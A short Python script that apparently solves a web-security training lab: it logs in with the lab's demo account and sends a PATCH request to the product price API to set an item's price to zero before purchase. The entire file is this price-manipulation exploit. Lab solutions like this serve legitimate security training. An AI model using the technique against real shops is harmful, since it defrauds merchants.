import requests

# Replace with your actual lab URL
BASE_URL = "https://0a8600f503d26d38805e303000780048.web-security-academy.net/"

# Step 1: Login
login_url = f"{BASE_URL}/login"
login_data = {
    "username": "wiener",
    "password": "peter"
}
session = requests.Session()
login_response = session.post(login_url, data=login_data)
if login_response.status_code != 200:
    print("Login failed")
    exit(1)

# Step 2: Set price to 0
price_url = f"{BASE_URL}/api/products/1/price"
headers = {
    "Content-Type": "application/json"
}
price_data = {"price": 0}
price_response = session.patch(price_url, json=price_data, headers=headers)
if price_response.status_code != 200:
    print("Failed to set price:", price_response.text)
    exit(1)

print("Price set to 0. Now manually add to cart and place order in the browser.")
